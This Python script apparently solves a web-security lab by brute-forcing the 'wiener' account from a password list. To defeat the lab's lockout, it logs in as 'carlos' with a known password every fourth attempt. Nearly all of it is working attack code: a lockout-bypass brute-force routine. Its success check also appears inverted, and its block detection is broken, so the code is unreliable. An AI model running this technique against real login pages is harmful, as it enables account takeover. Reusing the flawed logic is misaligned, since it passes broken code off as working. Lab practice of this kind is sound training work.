import json
from http import HTTPStatus

import requests
import re
from typing import Callable
import typer
from rich.console import Console
from rich.progress import Progress
from lxml import html
from valid8 import validate

console = Console()
app = typer.Typer()


def get_password():
    passwords = []
    with open('password.txt') as f:
        for line in f:
            passwords.append(line.strip())
    return passwords


def check_login_blocked(response):
    html_document = html.fromstring(response.content)
    check_block = html_document.xpath("//label[@id='error-label']")[0].text
    if len(check_block) > 0 and check_block == "You're blocked. Please try again in 1 minute":
        raise Exception(check_block[0].text)


def login(server):
    passwords = get_password()
    current_password = None
    index = 1
    with Progress() as progress:
        task = progress.add_task("[bold yellow]Try to access to Wiener account and discovering password...", total=len(passwords))
        while len(passwords) > 0:
            if index % 4 == 0:
                response = requests.post(f"{server}/login", data={
                    "username": "carlos",
                    "password": "montoya"
                })
            else:
                current_password = passwords.pop()
                response = requests.post(f"{server}/login", data={
                    "username": "wiener",
                    "password": current_password
                })
                progress.update(task, advance=1)

            index += 1
            check_login_blocked(response)
            if "302" not in str(response.history) and len(passwords) > 0:
                progress.update(task_id=task, description="[bold green]Password found", advance=len(passwords))
                break
    print("The password of Wiener is: " + current_password)


def check_lab_solver(server):
    response = requests.get(f"{server}/")
    html_document = html.fromstring(response.content)
    solved_link = html_document.xpath("//section[@id='notification-labsolved']")
    success_message = "Congratulations, you solved the lab!".center(100)
    error_message = "Not Solved!".center(100)

    if solved_link:
        console.print(success_message, style="blink bold white on dark_green")
    else:
        console.print(error_message, style="blink bold white on red")


def pattern(regex: str) -> Callable[[str], bool]:
    r = re.compile(regex)

    def res(value):
        return bool(r.fullmatch(value))

    res.__name__ = f'pattern({regex})'
    return res


def validate_server(server):
    validate("server", server, custom=[pattern(r'\w{4,5}:\/\/(localhost|127.0.0.1):4200$')],
             help_msg="Insert a valid localhost URL")

    if requests.get(f"{server}").status_code != 200:
        raise Exception("URL NOT VALID!")


def is_lab_solved(server):
    response = requests.get(f"{server}/")
    html_document = html.fromstring(response.content)
    solved_link = html_document.xpath("//section[@id='notification-labsolved']")
    return True if solved_link else False


@app.callback()
def main(
        server: str = typer.Option(
            ...,
            prompt=True,
            envvar="SERVER",
            help=f"Vulnerable server ID"
        )
):
    validate_server(server)

    with console.status("Try to access to Wiener account..."):
        login(server)

    with console.status("Checking solving lab"):
        check_lab_solver(server)


def run():
    try:
        typer.run(main)
    except Exception as e:
        console.print(f"[red bold]Error:[/red bold] {e}")


if __name__ == "__main__":
    run()
